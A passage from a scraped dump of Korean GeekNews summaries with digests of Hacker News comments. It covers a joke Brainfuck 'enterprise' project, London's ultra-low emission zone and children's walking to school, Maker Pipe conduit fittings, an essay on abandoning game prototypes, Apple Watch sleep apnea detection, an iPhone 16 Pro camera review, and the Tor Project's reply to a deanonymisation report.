     * 문제를 해결하기 위해 다양한 방법을 시도하고, 최종적으로 패딩을 사용하여 문제를 해결함
     * UI 개발자들에게 유용한 팁을 제공하며, 작은 문제들을 해결하는 과정의 중요성을 강조함
"
"https://news.hada.io/topic?id=16897","브레인퍽 엔터프라이즈 솔루션즈","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            브레인퍽 엔터프라이즈 솔루션즈

Brainfuck Enterprise Solutions 소개

   Brainfuck Enterprise Solutions(BES)는 현대 소프트웨어 개발의 복잡성을 관리할 수 있는 전문가 팀으로, Brainfuck 프로그래밍 언어와 소프트웨어 환경을 사용함. BES의 제품 라인업은 다음과 같음:
     * 차세대 운영 체제: OS.bf
     * 기능이 풍부한 텍스트 편집기: ed.bf
     * Brainfuck 임베디드 메타 인터프리터: meta.bf
     * 강력한 문자열 조작 라이브러리: str.bf
     * 곧 출시 예정: 비동기 웹 서버, 신뢰성 높은 키-값 저장소, 머신 러닝 프레임워크

   BES는 Brainfuck 커뮤니티의 건강을 유지하기 위해 내부 문서와 스타일 가이드를 공개함:
     * 범용 문서 가이드 및 다목적 마크업 형식: bf.doc
     * 고품질 제품을 위한 스타일 가이드: bf.style

주요 프로젝트

     * os.bf: 고성능 차세대 운영 체제
     * ed.bf: 무한히 구성 가능한 통합 IDE 및 텍스트 편집기
     * meta.bf: 고속 임베디드 Brainfuck 메타 인터프리터
     * str.bf: 고효율 문자열 조작 라이브러리
     * bf.doc: Brainfuck 코드베이스를 위한 포괄적인 문서 형식
     * bf.style: 중대형 저장소와 다양한 엔지니어 팀을 위한 최첨단 스타일 가이드

GN⁺의 정리

   Brainfuck Enterprise Solutions는 Brainfuck 프로그래밍 언어를 활용한 다양한 고성능 소프트웨어 솔루션을 제공함. 이 프로젝트는 특히 고성능과 신뢰성을 중시하는 엔터프라이즈 환경에 적합함. Brainfuck 커뮤니티를 위한 문서와 스타일 가이드를 공개하여 커뮤니티의 발전에 기여하고 있음. 비슷한 기능을 가진 다른 프로젝트로는 C 언어 기반의 고성능 시스템 소프트웨어가 있음.

        Hacker News 의견

     * 몇 년 전 Brainfuck 코드를 실행하는 CPU를 직접 제작한 경험을 공유함
     * 이 기술을 인프라에 도입하고 싶지만, 법적 문제로 이름 변경을 고려해야 함
     * BF는 읽기 어려운 코드로, Perl과 유사함
          + Ook! 같은 대체 언어를 사용하는 것이 좋음
     * 이런 프로젝트는 해커 정신을 느끼게 해주는 신선한 공기 같음
          + 최고의 밈은 고도의 노력과 기술이 필요하며, 유머와 풍자를 포함함
     * Brainfuck 코드 예시를 공유함
     * Brainfuck을 기업 솔루션으로 선택하는 것보다 Befunge를 선택하는 것이 더 나음
     * 회사가 INTERCAL에서 Brainfuck으로 마이그레이션하려고 함
     * 인터넷 초기 시절의 다양한 해커 문화와 커뮤니티를 그리워함
     * Brainfuck 커뮤니티를 건강하게 유지하겠다는 다짐을 최고의 문장으로 평가함
     * 너무 오래 지속된 농담 같음
"
"https://news.hada.io/topic?id=16899","런던, Ultra-Low Emissions Zone의 놀라운 혜택: 더 활동적인 아이들","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            런던, Ultra-Low Emissions Zone의 놀라운 혜택: 더 활동적인 아이들

    고배출 차량 제한의 이점

     * 고배출 차량의 도심 운행을 제한하면 공기 정화와 소음 감소 등 여러 이점이 있음
     * 유럽 전역에 300개 이상의 청정 공기 구역이 설정됨
     * 런던에서는 초저배출구역(ULEZ) 도입 후 아이들이 학교에 걸어가거나 자전거를 타는 비율이 증가함

    연구 배경

     * 2018년 런던 중심부에 초저배출구역이 도입되기 전, 케임브리지 대학교와 퀸 메리 대학교 연구진이 자연 실험을 계획함
     * 6~9세 어린이와 그 가족을 대상으로 다년간 연구를 진행하여 프로그램이 어린이 건강에 미치는 영향을 조사함
     * 연구는 주로 어린이의 폐 발달에 초점을 맞췄지만, 활동 수준, 정신 건강 등 부수적인 결과도 분석함

    연구 결과

     * 초저배출구역 도입 1년 후, 런던 학생의 2/5가 '수동적' 이동 방식에서 '능동적' 이동 방식으로 전환함
     * 런던에서는 부모가 차로 데려다주는 대신 걷거나 자전거를 타고 학교에 가는 비율이 증가함
     * 루턴에서는 1/5가 능동적 이동 방식으로 전환했지만, 동일한 비율이 수동적 이동 방식으로 전환함

    활동적인 통학의 중요성

     * 걷기, 자전거 타기, 스쿠터 타기는 아이, 가족, 환경 모두에게 이로움
     * 활동적인 통학은 아이들의 집중력과 학업 성취도 향상에 도움이 될 수 있음
     * 어린이 비만 예방에 중요한 신체 활동을 촉진함

    연구의 다음 단계

     * 부모가 아이들을 차로 데려다주지 않게 된 이유를 분석하는 후속 연구 예정
     * 초저배출구역의 일일 요금이 원인인지, 도로의 차량 감소로 인해 안전하다고 느꼈는지 등을 조사할 예정임

    미국에서의 도전 과제

     * 미국에서는 법적 장애물로 인해 런던과 같은 초저배출구역을 도입하기 어려움
     * 산타 모니카에서 자발적 무배출 배달 구역 시범 운영이 있었으나 단기간에 그침
     * 뉴욕시의 혼잡 통행료 구역 계획도 실패함

    인프라 개선의 필요성

     * 도시들은 보행자 친화적 인프라를 개선하고 보호된 자전거 도로를 구축해야 함
     * 연구에 따르면, 자동차 여행을 억제하는 것이 인프라 개선보다 더 효과적일 수 있음
     * 아이들의 건강이 지역사회와 지구의 건강에 이롭다는 증거를 추가함

    GN⁺의 정리

     * 초저배출구역 도입이 어린이들의 활동적인 통학을 촉진하고 건강에 긍정적인 영향을 미침
     * 미국에서는 법적 장애물로 인해 유사한 구역 도입이 어려움
     * 보행자 친화적 인프라 개선이 필요하며, 자동차 여행 억제가 더 효과적일 수 있음
     * 활동적인 통학은 어린이 비만 예방과 학업 성취도 향상에 도움을 줄 수 있음

        Hacker News 의견

     * 도로 설계와 안전: 네덜란드의 도로 설계는 오랜 기간 동안 많은 아이들이 자전거를 탈 수 있게 해왔음. 이는 배출 구역과는 무관하며, 도로 설계가 배출량 감소에도 도움을 줄 수 있음. 큰 도시에서는 자동차를 줄이고 자전거, 도보, 대중교통을 통해 더 많은 사람들이 안전하게 이동할 수 있도록 해야 함
     * 런던의 자동차 통계: 런던에서는 모든 인구 통계에 걸쳐 자동차 소유가 분포되어 있음. 저소득 가정에서도 많은 가정이 자동차를 소유하고 있으며, 이는 필요와 비용 지불 의사에 따라 결정됨. 최근 몇 년간 ULEZ, 저교통 지역, COVID, Brexit 등 여러 요인이 동시에 발생했음
     * EU의 LEZ 준수 어려움: EU에서는 각 국가마다 LEZ 규정이 달라 준수하기 어려움. 프랑스는 우편 사전 등록을 요구하고, 이탈리아는 각 지방 자치단체마다 규정이 다름. Google Maps는 LEZ 정보를 제공하지 않아 운전자들이 벌금을 받을 수 있음
     * 도시 설계와 교통: 도시 설계에서 위험하고 불쾌한 요소(자동차)를 제거하면 도보, 자전거, 대중교통이 활성화됨
     * 런던의 공기 질 개선: 런던의 공기가 이전보다 눈에 띄게 깨끗해졌으며, 런던 시민들은 이를 자랑스러워해야 함
     * 자동차 감소 효과: 배출 구역 내 자동차 수가 줄어들어 보행자, 자전거 이용자, 스쿠터 이용자에게 더 쾌적한 환경을 제공함. 미국에서도 시도해보길 바람
     * 브뤼셀의 EV 계획: 브뤼셀은 2035년까지 전기차만 허용할 계획이지만, 충전 인프라 투자가 부족함. 도시에서 자동차 소유가 특권이 될 가능성이 있음
     * 런던의 지역별 공기 질 차이: 런던의 중심부는 공기가 깨끗하지만, 외곽 지역은 배기가스와 스모그로 인해 공기 질이 나쁨. 이는 경제적 격차와 관련이 있음
     * 영국의 건강 평가: 영국에서 모든 사람 또는 학생이 연간 건강 평가를 받는지에 대한 질문
     * 미국에서 아이들의 활동성 증가 방법: 미국에서 아이들이 더 활동적이 되려면, 인근에 공터나 공원이 필요함. 이는 아이들이 자유롭게 놀고 사회화할 수 있는 공간을 제공함
"
"https://news.hada.io/topic?id=16936","DIY 제작자를 위한 Maker Pipe – 구조용 파이프 피팅","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  DIY 제작자를 위한 Maker Pipe – 구조용 파이프 피팅

Maker Pipe 시스템

     * Maker Pipe는 일반 EMT Conduit를 저렴한 건축 플랫폼으로 변환하는 강철 파이프 커넥터 시스템임.
     * 간단한 수공구로 쉽게 조립 가능함.

  EMT Conduit

     * EMT Conduit는 강하고 신뢰할 수 있는 아연 도금 강철 파이프임.
     * 지역 하드웨어 또는 홈 개선 상점의 전기 코너에서 쉽게 구할 수 있음.

  함께 사용하면

     * 쉬움: 특별한 도구나 기술이 필요 없으며, 5mm 육각 렌치만으로 연결 가능함.
     * 저렴함: 저렴한 전기 도관과 결합하여 비용을 절감할 수 있음.
     * 강함: 내구성 있는 강철로 제작되어 실내외에서 자신 있게 사용할 수 있음.

  다양한 프로젝트 가능

     * 책상부터 고카트까지 다양한 창의적인 프로젝트를 만들 수 있음.
     * 고객들의 다양한 프로젝트 예시와 후기 확인 가능.

  인기 있는 구조용 파이프 피팅

     * T Connector: 가장 인기 있고 다재다능한 구조용 파이프 피팅으로, 전기 도관에 맞게 설계됨.
     * 90도, 180도, 45도 구조용 파이프 커넥터: 다양한 각도로 파이프를 연결할 수 있음.
     * 혼합 구조용 파이프 커넥터 번들: 다양한 피팅을 포함하여 DIY 초보자와 전문가 모두에게 적합함.

  T Connector 사용법

     * T Connector는 두 개의 EMT Conduit를 연결하는 데 사용됨.
     * 다양한 커뮤니티 빌드를 통해 T Connector의 다양한 사용 방법을 소개함.
     * 조립 비디오: T Connector의 개요와 조립 방법을 설명하는 비디오 제공.

  커뮤니티와 소셜 미디어

     * Maker Pipe 커뮤니티와 소셜 미디어에서 다양한 프로젝트와 아이디어를 공유할 수 있음.
     * Facebook, Instagram, TikTok에서 Maker Pipe를 팔로우할 수 있음.

  고객 서비스

     * FAQ, 배송, 반품 및 보증, 연락처 정보 제공.
     * 이메일 구독 시 750개 이상의 Maker Pipe 빌드를 포함한 무료 전자책 제공.

GN⁺의 정리

     * Maker Pipe는 EMT Conduit를 저렴하고 쉽게 사용할 수 있는 건축 플랫폼으로 변환하는 시스템임.
     * 간단한 도구로 누구나 쉽게 조립할 수 있으며, 다양한 창의적인 프로젝트를 만들 수 있음.
     * 강력한 내구성을 자랑하며, 실내외에서 모두 사용할 수 있음.
     * 다양한 커뮤니티 빌드와 소셜 미디어를 통해 아이디어를 공유하고 영감을 받을 수 있음.
     * 비슷한 기능을 가진 제품으로는 Kee Klamp와 Simplified Building이 있음.

        Hacker News 의견

     * Make Pipe Minis는 아이디어를 프로토타입하는 훌륭한 방법임
          + 이 사이트의 진정한 보물은 Make Pipe Minis임
          + 실물 제작 전에 아이디어를 프로토타입할 수 있는 좋은 방법임
          + 오픈 소스로 제공되어 STL 파일을 다운로드해 직접 커넥터를 인쇄할 수 있음
     * Orlando Maker Faire에서 Maker Pipe 부스를 본 기억이 있음
          + 금속 파이프는 예산에 맞지 않았지만, PVC와 커스텀 3D 프린팅 커넥터를 사용해 정원 프로젝트를 시작하게 됨
     * PVC 커넥터 작업에 많은 노력을 기울인 점이 마음에 듦
          + PVC로 흥미로운 프로젝트를 만드는 데 가장 큰 장애물 중 하나는 90도 각도 외의 사전 제작된 커넥터를 찾는 것임
          + 대부분의 PVC 프로젝트가 건설용이기 때문에 이해는 되지만 여전히 불편함
          + 사전 드릴된 나사 구멍이 있는 것도 좋은 보너스임
     * EMT 도관은 인체 무게를 지탱하기에 좋은 지지 재료가 아님
          + 홈페이지의 사진에서 강도를 보여주고 있지만 눈에 띄게 휘어짐
          + 낮은 무게는 ABS를 사용하고, 높은 무게는 Steeltek이나 Kee Klamp 같은 1 1/4"" 시스템을 사용함
     * ""할인된"" 번들은 반패턴임
          + 20개 중 하나의 피팅 가격을 절약함
          + 번들에 필요 없는 피팅이 하나라도 있으면 전체 거래가 무의미해짐
          + 모든 커넥터를 사용할 수 있는 양을 가진 사람은 더 나은 거래를 협상하고 싶어할 것임
     * ""80/20""와 비교하면 어떨까?
          + 과거 스타트업에서 공장 스테이션 구조에 80/20을 사용했음
          + 프로토타입과 테스트 중에 쉽게 적응할 수 있었고, 최종 디자인을 빠르게 복제할 수 있었음
          + 몇 가지 조립으로 분해해 아시아 공장에서 재조립할 수 있었고, 생산에서도 잘 버텼음
          + 80/20은 Lego 같은 장난감으로 자란 사람들에게 매력적임
     * 더 무거운 작업을 원하는 사람은 Kee Klamp를 좋아할 것임
          + Kee Klamp는 무거운 작업에 적합한 피팅을 제공함
     * EMT 도관은 Burning Man 같은 이벤트에서 그늘 구조물로 매우 인기가 있음
          + 바람이 많이 부는 조건에서도 잘 견딜 수 있는 피팅을 구할 수 있음
     * 간단한 구조물을 빠르고 저렴하게 만들기 위해, 아버지는 도관 끝을 평평하게 만들어 볼트와 너트를 위한 구멍을 뚫었음
     * 이 요소들이 마찰 맞춤인지 궁금함
          + 마찰 맞춤은 하중을 처리하는 데 매우 나쁜 아이디어임
          + 기름 한 방울로 구조물이 무너질 수 있음
          + 나사가 시간이 지나면서 느슨해질 수 있음
          + 유럽에서는 전기 배선에 금속 파이프 대신 PVC를 사용함
     * 대학 시절 기숙사 방에 암막 커튼을 도관으로 걸었음
          + 도관은 더 길고 튼튼하며 저렴하고 덜 성가셨음
          + 구조적 굴곡을 추가할 수 있는 도관 굽힘 도구가 있음
          + 규모의 경제를 사랑함
"
"https://news.hada.io/topic?id=16919","빠르게 움직이고, 포기하기","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             빠르게 움직이고, 포기하기

     * 가을이 되면 과거를 돌아보게 됨
     * 오래된 하드 드라이브에서 35년 전 작성한 게임을 복구하려고 시도함
     * 예전의 쉐어웨어 게임을 디스크 이미지로 모아 GitHub에 게시함

      거의 완성되지 않은 프로젝트들

     * 과거의 게임 실험들을 다시 발견하고 복구하는 과정에서 많은 것을 배움
     * 일부 실험들은 조금 더 시간을 투자했다면 좋은 게임이 되었을 수도 있음
     * 예를 들어, AirBikes는 미래 지향적인 레이싱 게임이 될 예정이었음

      빠르게 움직이기

     * 1991년에 작성한 게임과 ""크리에이터 코드"" 목록을 발견함
     * 크리에이터 코드는 당시의 번들 식별자와 유사한 개념이었음
     * 27개의 타이틀 중 5개를 출시했으며, 나머지는 빠르게 프로토타입을 만들기 위한 실험이었음

      프로토타입 만들기

     * 게임이 재미있는지 확인하기 위해 빠르게 프로토타입을 만드는 것이 중요함
     * 예를 들어, 연을 조종하는 게임이 재미있는지 확인하기 위해 몇 일 만에 프로토타입을 만듦
     * 게임의 재미는 종종 예상치 못한 요소에서 나옴

      포기하기

     * 일부 게임은 시작은 좋았지만 끝까지 완성되지 못함
     * 예를 들어, Thief of Baghdad는 마법 양탄자를 타고 다니는 게임이었지만, 더 이상 발전하지 못함
     * 혼자서 모든 것을 개발하는 것은 매우 어려운 일임

      완전히 죽지 않음

     * shelved 프로젝트는 언제든지 다시 돌아갈 수 있음
     * 예를 들어, Thief of Baghdad를 18개월 후에 다시 시도했지만, 결국 다시 포기함
     * shelved 프로젝트에서 코드를 재활용할 수 있음

      샐러리맨

     * 1990년대 후반, Apple에서 일하게 되면서 더 이상 개인 프로젝트를 할 수 없게 됨
     * Apple에서의 경험은 빠른 프로토타이핑 접근 방식을 계속 사용하게 함
     * 동료들은 주로 화이트보드에서 계획을 세우고, 나는 빠르게 코드를 작성함

      A.B.I. (“Always Be Iterating.”)

     * Apple에서의 경험을 통해 자신이 기여하는 직원임을 느끼게 됨
     * 빠른 프로그래밍 능력을 인정받음
     * 딸들에게 ""항상 반복하라""는 교훈을 전함

      GN⁺의 정리

     * 이 글은 과거의 게임 개발 경험을 통해 얻은 교훈을 공유함
     * 빠른 프로토타이핑과 반복의 중요성을 강조함
     * 게임 개발자들에게 유용한 인사이트를 제공함

        Hacker News 의견

     * 많은 회사들이 새로운 기능을 출시하고, 시간이 지나면서 버그가 쌓이는 문제를 겪음. 원래 개발자는 다른 팀으로 이동하고, 남은 엔지니어들이 유지보수를 맡음. 이는 매우 힘든 상황임
     * 1989년부터 프로그래밍을 시작한 이후로 많은 프로젝트를 포기했음. 대부분 게임이었고, Mac Plus나 Mac LC에서 작성됨. UBI가 인간의 잠재력을 크게 증대시킬 수 있다고 생각함
     * 68K Macintosh용 소프트웨어를 다시 개발하고 있음. 옛날 코드를 새로운 시각으로 보는 것이 흥미로움. 1비트 아트에 대한 애정이 있음. 제한된 시스템에서 프로그래밍하는 것이 현대의 모든 것을 할 수 있는 환경과는 다름
     * 프로젝트를 포기하는 것이 괜찮다고 생각함. 작은 프로젝트부터 시작해 완성하는 기술을 익히는 것이 중요함. 친구들은 게임 엔진을 만들다가 지쳐버리곤 함. 작은 것부터 시작해 점점 큰 프로젝트로 나아가는 것이 좋음
     * 자동차 프로토타입이 Spy Hunter 그래픽을 떠올리게 했음. 추억 여행을 하게 됨
     * 어릴 때 Mac에서 프로그래밍을 배우며 Glider와 Pararena를 많이 플레이했음. ResEdit에서 게임의 리소스 포크를 탐험했음. 작은 쉐어웨어 게임을 완성하고 AOL에 업로드했음. 캘리포니아에서 온 수표를 받았을 때 매우 놀랐음. 초기 Mac 시절은 특별한 시간이었음
     * 스크린샷의 픽셀 아트가 매우 멋짐
     * 작은 것들을 출시하고 반복하는 것이 더 많은 것을 배우고 얻는 방법임
     * 프로젝트를 포기하는 것을 정상화하는 것이 좋은 아이디어인지 확신할 수 없음. 완성하는 것도 중요함
     * 나쁜 코드나 유지보수하기 어려운 코드를 작성하는 것은 좋지 않음. 무료 호스팅 서비스를 사용하고, 공용 저장소에 프로젝트를 올려 다른 사람이 찾을 수 있게 함. 좋은 문서를 작성해 누구나 프로젝트를 실행할 수 있게 함
"
"https://news.hada.io/topic?id=16804","애플 워치 수면 무호흡증 감지 기능 FDA 승인 획득","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     애플 워치 수면 무호흡증 감지 기능 FDA 승인 획득

     * 미국 식품의약국(FDA)은 애플 워치 시리즈 9, 시리즈 10, 워치 울트라 2의 수면 무호흡증 감지 기능을 승인함
     * 이 기능은 iPhone 16 이벤트에서 발표되었으며, watchOS 11 업데이트와 함께 제공될 예정임
     * 사용자가 이 기능을 활성화하면 30일 동안 10일치의 수면 데이터를 수집하여 수면 무호흡증 위험을 평가함
     * 이 기능은 진단 도구가 아니며, 사용자가 의료 제공자에게 정식 진단을 받도록 권장함
     * 수면 무호흡증은 불면증, 두통, 주간 졸림 등의 증상을 유발할 수 있음
     * Withings와 삼성도 이와 유사한 기능을 제공하고 있음
     * 혈중 산소 감지 기능은 특허 분쟁으로 인해 미국에서 비활성화됨

        Hacker News 의견

     * iOS 앱을 개발하여 수면 자세를 감지하고 등을 대고 자면 진동을 시작함. Apple은 의료적 이유로 승인을 거부했지만 여전히 사용 중이며 효과적임
     * 수면 무호흡증이 있어 이를 막기 위한 임플란트를 사용 중임
          + 시계가 무호흡증 가능성을 알려주면 수면 검사를 받아야 함
          + 무호흡증과 코골이는 함께 발생할 수 있지만 항상 그런 것은 아님
          + 무호흡증은 고혈압처럼 서서히 건강을 해침
          + 다양한 치료 옵션이 있으며, 체중 감량이나 옆으로 자는 것 등이 있음. 수면 검사를 통해 확인해야 함
          + 무호흡증 치료 후 새로운 사람처럼 느껴짐. 피로가 얼마나 심했는지 몰랐음. 치료를 고려해야 함
     * 개념은 좋지만 작동 방식이 궁금함. 착용자의 움직임을 감지하는 것인지 궁금함. Apple이 SpO2 센서와 관련된 특허 문제를 겪고 있어 아쉬움. O2Ring이 초기 수면 무호흡증 이해에 큰 도움이 되었음
     * iPhone 16 이벤트에서 발표된 기능이 watchOS 11 출시와 함께 도입될 예정임. Apple이 승인 전에 어떻게 사전 발표를 할 수 있었는지 궁금함. 다른 기관들은 이런 방식으로 일하지 않음
     * APAP 기계를 몇 달 동안 사용하려고 했지만 실패함. 아내는 문제 없이 사용 중임. 다음 단계가 무엇인지 모르겠음. 나쁜 수면 후에는 생각이 잘 안 됨. CPAP를 통해 몇 시간 동안 숨을 쉴 수 있지만 잠을 자려고 하면 숨이 막히고 심장이 뛰기 시작함. 조언이 필요함
     * 수면 추적에 있어 배터리 수명이 더 긴 대안이 있는지 궁금함. 다른 스포츠 추적 기능은 상관없음
     * 수면 무호흡증의 주요 원인은 목의 변형된 근막이라고 생각함. 현대의 좌식 생활 방식의 질병임. CPAP 기기가 매우 흔한 것이 놀라움
     * 웨어러블에서 제공되는 훌륭한 ""무료"" 기능임. Ozempic 같은 약물이 수면 무호흡증을 드물게 만드는 날이 올 것임
     * Apple과 Google이 더 많은 의료 기능을 추가할 때 계정이 차단되면 모든 기능을 잃게 될 것임. 이는 모바일 컴퓨팅에 대한 통제를 깨는 문이 될 수 있음
     * 무호흡증 위험이 있는 경우 Apple Watch를 처방받을 수 있는지, 또는 HSA를 사용할 수 있는지 궁금함
"
"https://news.hada.io/topic?id=16869","사진작가 Austin Mann의 아이폰 16 프로 카메라 리뷰","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   사진작가 Austin Mann의 아이폰 16 프로 카메라 리뷰

     * iPhone 16 Pro의 주요 카메라 기능은 새로운 카메라 컨트롤 버튼, 업그레이드된 48MP 울트라 와이드 센서, 향상된 오디오 녹음 기능(바람 소리 감소 및 오디오 믹스), 포토그래픽 스타일
     * 지난 한 주 동안 케냐 전역을 1000km 이상 여행하며, 새로운 아이폰 16 프로와 아이폰 16 프로 맥스 카메라로 10,000장 이상의 사진을 찍고 3TB 이상의 ProRes 영상을 기록함
     * iPhone 카메라의 한계를 시험하기 위해 케냐의 다양한 자연 환경에서 테스트 진행

  48MP 울트라 와이드 카메라

     * iPhone 16 Pro에서 가장 기대했던 기능은 48MP 울트라 와이드 카메라
     * iPhone 15 Pro의 12MP 울트라 와이드 카메라에 비해 해상도가 크게 향상됨-
     * 매크로 모드도 48MP 울트라 와이드 카메라를 사용하며, 세밀한 디테일을 담아내는 능력이 매우 뛰어남
     * 매크로 촬영에서도 해상도의 이점을 충분히 활용 가능

  카메라 컨트롤 버튼

     * 카메라 컨트롤 버튼은 물리적인 클릭감을 제공, 장갑을 끼고도 쉽게 조작 가능
     * 버튼으로 카메라 앱을 더 빠르게 실행할 수 있으며, 기본 앱 뿐만 아니라 Halide와 같은 서드파티 앱에서도 사용 가능
     * 헬리콥터나 사파리 차량에서 촬영할 때 우발적으로 설정을 건드릴 위험이 있었지만, 설정에서 사용자화 가능

  포토그래픽 스타일

     * 포토그래픽 스타일은 단순한 프리셋이 아니라, 피부 톤을 포함한 이미지의 다양한 요소를 섬세하게 조절해줌
     * 다양한 스타일을 사용해 인물, 풍경 등을 다르게 표현할 수 있으며, 자연스럽고 개인화된 이미지를 얻을 수 있음
     * 피부톤을 유지하면서도 사진의 느낌을 크게 바꿀 수 있음. 촬영 전에 스타일을 선택할 수 있지만 나중에 변경할 수도 있음

  48MP Fusion 카메라

     * 고해상도 촬영을 위한 48MP Fusion 카메라는 케냐의 역동적인/극한 환경에서도 빠르고 정확하게 촬영 가능
     * 빠르게 이동하는 환경에서도 초점을 맞춰 선명한 이미지를 얻을 수 있었으며, 카메라가 비교적 빠르게 반응함

  4K 120 FPS 영상 촬영 및 오디오 개선

     * iPhone 16 Pro의 4K 120 FPS 촬영은 주로 슬로우 모션 촬영에 적합
     * 오디오 개선: 바람 소리를 줄여주는 기술로 현장에서 더 나은 음질을 제공하며, 기존의 문제를 해결하는 데 도움을 줌

  iPhone과 Apple Watch의 연동

     * Apple Watch Ultra를 사용해 리모트 셔터로 iPhone 16 Pro 카메라를 원격으로 촬영 가능, 특히 동물 촬영에서 유용하게 활용됨

  개선 희망 사항

     * 망원 카메라에도 4800만 화소 센서가 탑재되기를 바람. 구현이 얼마나 어려울지 상상이 안 가지만, 모든 후면 카메라에 동일한 해상도가 있다면 환상적일 것임
     * 포토그래픽 스타일의 파워는 좋지만 ProRAW의 유연성도 중요하게 생각함. 둘을 결합하는 것이 불가능하다면, 스타일에서 이미지의 선명도나 또렷함을 조절할 수 있는 슬라이더가 있으면 좋겠음
     * 인기 있는 것으로 알고 있지만, 개인적으로는 사진과 비디오를 즉석에서 전환하는 일이 거의 없어서 탭앤홀드 기능을 비디오용으로 사용한 적이 없음. 보통은 둘 중 하나만 촬영함. 하지만 연사 모드는 자주 사용함
     * 아이폰 14 Pro 리뷰에서 디지털 워크플로 개선의 필요성과 바람 감소에 대해 광범위하게 썼는데, 이 두 영역에서 큰 진전이 있었던 것을 보고 매우 기쁨

  사진작가를 위한 구매 조언

     * 현재 아이폰이 라이트닝 포트를 사용한다면 USB-C로 업그레이드하는 것이 좋음. 더 빠른 충전, 고속 프레임률로 ProRes Log를 SSD에 촬영할 수 있는 기능, 다른 장치와의 호환성 향상, 전문적인 액세서리 사용 가능 등의 장점이 있음
     * 초광각 카메라(.5x) 또는 매크로 모드를 자주 사용한다면 새로운 4800만 화소 센서는 성능이 매우 우수한 상당한 업그레이드임
     * 카메라 컨트롤은 혁명적이지는 않지만 아이폰에서 사진을 찍는 가장 빠른 방법이며, 써드파티 앱인 Halide등을 실행하도록 프로그래밍할 수 있는 기능도 훌륭함
     * 비상 메시지 이외의 위성 연결은 미국과 캐나다에서만 지원되므로 사파리에서 연결 상태를 유지하기 위해 업그레이드한다면 다시 생각해 볼 것. 하지만 글레이셔 국립공원과 같이 많은 시간을 보내는 오지에서는 이 기능이 매우 귀중할 것임
     * 아이폰 16 Pro의 A18 Pro 칩은 믿을 수 없을 정도로 빠름. ProRAW로 촬영하는 것이 이전 모델보다 훨씬 더 빠르고 반응이 좋음
     * 아이폰 16 Pro와 아이폰 16 Pro Max는 이제 동일한 카메라 시스템을 갖추고 있음(작년에는 Max만 5배 망원 렌즈 보유). 작은 크기를 선호하지만 이전에는 더 나은 카메라를 위해 Max를 사용함
     * 새로운 포토그래픽 스타일은 매우 강력하며, 모든 아이폰 사용자가 친구들과 함께 사진 촬영을 경험하고 즐기는 방식을 크게 향상시킬 것임. 라이트룸과 같은 도구로 전문적인 사진 편집을 하지 않는다면 이 기능 하나만으로도 업그레이드할 만한 가치가 있음
"
"https://news.hada.io/topic?id=16833","Tor 여전히 안전한가?","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Tor 여전히 안전한가?

Tor는 여전히 안전한가?

  책임 있는 공개

     * 최근 조사 뉴스에서 오래된 Ricochet 애플리케이션을 사용한 Tor 사용자의 Onion Service가 익명성이 해제된 사건이 보도됨
     * Tor 사용자는 여전히 Tor Browser를 통해 안전하고 익명으로 웹에 접근할 수 있음
     * 대부분의 사용자에게 Tor는 여전히 최고의 프라이버시 보호 솔루션임
     * Ricochet-Refresh 버전 3.0.12 이후 Vanguards-lite와 vanguards 애드온이 추가되어 이러한 공격을 방지할 수 있음

  더 많은 정보 요청

     * Chaos Computer Club(CCC)는 사건 관련 문서에 접근할 수 있었으나, Tor Project는 제한된 정보만 제공받음
     * Tor Project는 사건에 대한 추가 정보를 요청하며, 이를 통해 사용자 보호를 위한 최선의 조치를 취할 수 있음
     * 이메일을 통해 정보를 제공해 줄 것을 요청함 (security@torproject.org)

  건강한 네트워크

     * Onion Services는 Tor 네트워크 내에서만 접근 가능함
     * 최근 몇 년간 exit 노드 수가 크게 증가했으며, 2019-2021년 사이의 공격은 오래된 Ricochet 애플리케이션에서 발생함
     * Tor Browser 사용자는 연결 시간을 짧게 유지하면 '타이밍' 분석에 덜 취약함
     * 네트워크 건강 팀은 악성 릴레이를 식별하고 제거하는 프로세스를 구현함
     * Tor 커뮤니티와 릴레이 운영자와의 대화를 통해 릴레이 다양성 문제를 해결하려고 노력 중임

  당신이 도울 수 있는 방법

     * Tor 네트워크의 하드웨어, 소프트웨어, 지리적 다양성을 보장하기 위해 대역폭과 릴레이를 기부할 것을 권장함
     * Tor 소프트웨어를 최신 상태로 유지하고 Tor Project의 공식 채널에서 제공하는 지침을 따르는 것이 중요함
     * Tor는 대규모 인터넷 사용자 감시를 어렵게 만드는 탈중앙화된 인터넷 모델을 제공하는 몇 안 되는 대안 중 하나임

GN⁺의 정리

     * 이 기사는 오래된 Ricochet 애플리케이션을 사용한 Tor 사용자의 익명성 해제 사건에 대한 조사 뉴스에 대응하여 작성됨
     * Tor는 여전히 대부분의 사용자에게 최고의 프라이버시 보호 솔루션이며, 최신 소프트웨어 버전을 사용하는 것이 중요함
     * Tor 네트워크의 건강을 유지하고 보호하기 위해 대역폭과 릴레이 기부가 필요함
     * Tor는 탈중앙화된 인터넷 모델을 제공하여 대규모 감시를 어렵게 만듦

        Hacker News 의견

     * Tor 노드 운영에 대한 의문: 개인이 1000개의 Tor 노드를 운영하고 모든 로그를 기록하면 특정 사용자를 찾을 수 있을 것이라는 의견
          + 비용은 한 달에 $5000 이하로 예상됨
          + 특정 사용자를 타겟팅할 수는 없지만, 결국 모든 노드가 자신의 노드인 경우를 찾을 수 있을 것임
     * Tor 사용을 막는 것이 가장 좋은 공격 방법: Tor가 안전하지 않다고 설득하려는 사람들의 의도를 의심해야 함
     * NDR 보고서: NDR이 타이밍 공격을 통해 '입력 서버'를 식별할 수 있다고 주장함
          + 자세한 정보는 부족하지만, 이 방법으로 이미 체포 사례가 있다고 주장함
     * Tor 초보자의 질문: 국가 안보 기관이 노드를 수정하여 트래픽을 자신이 제어하는 다른 노드로 라우팅할 수 있는지에 대한 의문
     * 연방 기관의 Tor 노드 운영: 연방 기관이 충분한 종료 노드를 운영하여 Tor 사용을 위험하게 만들 수 있음
          + 불법 활동을 계획 중이라면 Tor 사용을 피하는 것이 좋음
     * Tor의 합법적 사용에 대한 관심: Tor가 억압적인 정권에서 시민들의 웹 사용을 추적하기 어렵게 만들기 위해 설계되었음을 이해함
          + Tor의 사용 목적에 대한 진지한 질문
